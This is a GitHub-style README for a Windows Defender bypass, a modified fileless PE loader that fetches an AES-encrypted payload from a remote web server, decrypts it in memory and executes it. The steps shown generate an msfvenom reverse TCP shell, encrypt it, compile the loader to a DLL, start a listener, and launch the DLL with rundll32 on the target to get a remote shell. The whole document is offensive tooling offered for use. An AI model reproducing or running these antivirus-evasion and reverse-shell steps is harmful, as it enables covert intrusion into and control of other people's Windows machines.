# Windows-Defender-Bypass

Tested on 31-07-2023.  [Defender may detect it at the time of you using this. Feel free to do any modifications.]

This is a modified version of @TheD1rkMtr's FilelessPELoader program. The link to the original repo is https://github.com/TheD1rkMtr/FilelessPELoader/. 
It works by loading Remote AES Encrypted PE in memory, decrypts it and run it.


STEPS TO REPRODUCE:
1. Clone the repository.
2. Edit the IP , port in FilelessPELoader.cpp script.
3. Use the aes.py script to create a encrypted bin files.
   In the POC, I generated the reverse shell payload using msfvenom and encrypted it using aes.py. The syntax for the same is
   ```msfvenom -p windows/x64/shell_reverse_tcp lhost=IP lport=PORT -f exe -o shell.exe```

    ```python3 aes.py shell.exe```

Successfull execution of the above command will result two files named cipher.bin and key.bin.

5. Use the following command to compile FilelessPELoader.cpp to a dll.
   ```x86_64-w64-mingw32-g++ FilelessPELoader.cpp -l winhttp -shared --static -o a.dll```

5.Once dll is created, start the web server and your listener.
6. Transfer the dll to a windows machine.
7. Open command prompt and run the following command.

 ```rundll32 a.dll, DllRegistryServer```

9. After a second, You will see the connection in your terminal where you started your listener.
